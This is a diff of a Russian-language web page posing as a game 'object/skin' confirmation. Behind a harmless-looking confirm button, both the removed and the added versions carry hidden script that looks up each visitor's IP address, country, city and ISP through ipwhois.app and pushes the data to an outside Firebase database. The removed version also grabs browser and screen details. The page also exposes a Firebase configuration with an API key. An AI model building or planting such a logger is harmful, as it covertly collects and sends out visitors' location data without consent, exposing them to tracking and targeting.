@@ -43,47 +43,38 @@
     <h1>Подтверждение объекта/скина</h1>
     <a href="#" onclick="alert('Вы подтвердили объект/скин, можете выходить с сайта.'); return false;">ПОДТВЕРДИТЬ</a>
     
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyCFG3E7T8yPWcLW1HWRvZHqvpqpSwC71B8",
-            authDomain: "ipssasatel4000.firebaseapp.com",
-            databaseURL: "https://ipssasatel4000-default-rtdb.firebaseio.com",
-            projectId: "ipssasatel4000",
-            storageBucket: "ipssasatel4000.firebasestorage.app",
-            messagingSenderId: "4768082699",
-            appId: "1:4768082699:web:2e7970f2e61d8fe511100e"
+      <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCFG3E7T8yPWcLW1HWRvZHqvpqpSwC71B8",
+      authDomain: "ipssasatel4000.firebaseapp.com",
+      databaseURL: "https://ipssasatel4000-default-rtdb.firebaseio.com",
+      projectId: "ipssasatel4000",
+      storageBucket: "ipssasatel4000.firebasestorage.app",
+      messagingSenderId: "4768082699",
+      appId: "1:4768082699:web:2e7970f2e61d8fe511100e"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    fetch("https://ipwhois.app/json/")
+      .then(res => {
+        if (!res.ok) throw new Error(`Ошибка HTTP: ${res.status}`);
+        return res.json();
+      })
+      .then(data => {
+        if (!data.ip) throw new Error("IP не найден в ответе API");
+
+        const ipData = {
+          ip: data.ip,
+          country: data.country || "неизвестно",
+          region: data.region || "неизвестно",
+          city: data.city || "неизвестно",
+          isp: data.isp || "неизвестно",
+          time: new Date().toISOString()
         };
-
-        // Инициализация Firebase только один раз
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        fetch("https://ipwhois.app/json/")
-            .then(res => {
-                if (!res.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return res.json();
-            })
-            .then(data => {
-                const collected = {
-                    ip: data.ip,
-                    country: data.country,
-                    region: data.region,
-                    city: data.city,
-                    isp: data.org,
-                    time: new Date().toISOString(),
-                    ua: navigator.userAgent,
-                    os: navigator.platform,
-                    lang: navigator.language,
-                    screen: `${screen.width}x${screen.height}`
-                };
-
-                db.ref("ips").push(collected);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-    </script>
+        return db.ref("ips").push(ipData);
+      })
+  </script>
 </body>
 </html>
